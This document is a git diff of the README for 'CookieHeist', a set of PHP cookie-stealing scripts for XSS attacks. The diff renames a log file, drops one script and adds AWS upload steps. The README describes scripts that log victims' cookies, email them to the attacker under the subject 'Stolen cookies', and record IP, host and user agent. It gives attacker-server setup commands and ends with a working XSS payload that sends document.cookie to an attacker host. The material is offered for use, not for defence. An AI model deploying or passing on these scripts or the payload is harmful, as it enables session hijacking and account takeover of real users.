@@ -1,13 +1,11 @@
 # CookieHeist
 PHP Cookie Stealing Scripts for use in XSS
 
-1. Cookiesteal-simple.php - Records whatever "c" parameter holds, in example case the document.cookie string, writes value to cookielog.txt. 
+1. Cookiesteal-simple.php - Records whatever "c" parameter holds, in example case the document.cookie string, writes value to log.txt. 
 
-2. Cookiesteal-simple-v2.php - Records whatever "c" parameter holds, writes value to cookielog.txt and redirects to Google.com.
+2. Cookiemail.php - This version code will mail the cookies to hacker mail using the PHP() mail function with subject “Stolen cookies”.
 
-3. Cookiemail.php - This version code will mail the cookies to hacker mail using the PHP() mail function with subject “Stolen cookies”.
-
-4. Cookiesteal-v.php (verbose) - Collects the IP address, port number, host(usually computer-name), user agent and cookie.
+3. Cookiesteal-v.php (verbose) - Collects the IP address, port number, host(usually computer-name), user agent and cookie.
 
 ## Usage
 1. On the remote attacker machine, start the webserver (Apache2 in example):
@@ -26,9 +24,14 @@ cd CookieHeist
 sudo scp cookiestealer-simple.php username@AttackMachine:/var/www/html/
 
 
-sudo scp cookielog.txt username@AttackMachine:/var/www/html/
+sudo scp log.txt username@AttackMachine:/var/www/html/
 
+AWS Version:
 
-Example: http://[Attacker Webserver]/cookiesteal-simple.php?c=document.cookie
+scp -i AWS-Key.pem cookiesteal-simple.php ec2-user@ec2[YOUR IP].us-east-2.compute.amazonaws.com:~/.
+
+sudo mv cookiestealer-simple.php /var/www/html/
+
+Example: http://[Attacker Webserver]/cookiesteal-simple.php
 
 XSS Payload Example: <script javascript:text>document.location="http://[Attacker Webserver]?c=" + document.cookie + "&t=Alert"; </script>
